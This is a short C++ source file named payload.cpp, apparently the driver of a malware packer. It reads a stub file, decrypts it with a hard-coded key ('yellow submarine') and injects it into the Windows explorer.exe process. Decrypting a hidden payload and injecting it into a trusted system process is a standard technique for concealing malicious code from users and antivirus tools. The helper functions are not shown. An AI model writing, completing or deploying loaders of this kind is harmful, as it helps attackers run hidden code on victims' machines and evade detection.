/**
 * payload.cpp
 */

#include "packer.hpp"

int main(int argc, char **argv)
{
    packer_t packer;
    if (!packer_read(&packer, "stub")) {
        return 1;
    }

    packer_decrypt(&packer, "yellow submarine");
    if (!packer_inject(&packer, "c:/windows/explorer.exe")) {
        return 1;
    }

    packer_free(&packer);
    return 0;
}